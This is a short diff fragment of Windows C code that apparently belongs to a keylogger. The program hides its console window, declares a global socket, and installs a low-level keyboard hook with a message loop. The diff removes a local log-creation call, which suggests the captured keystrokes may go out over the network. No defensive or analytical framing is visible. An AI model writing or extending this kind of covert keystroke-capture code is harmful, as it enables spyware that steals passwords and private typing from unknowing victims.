@@ -14,7 +14,6 @@ SOCKET s;
 
 int main(void) {
   hideConsole();
-  createLog();
   hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
   MSG msg;
   while (GetMessageA(&msg, NULL, 0, 0) > 0) {
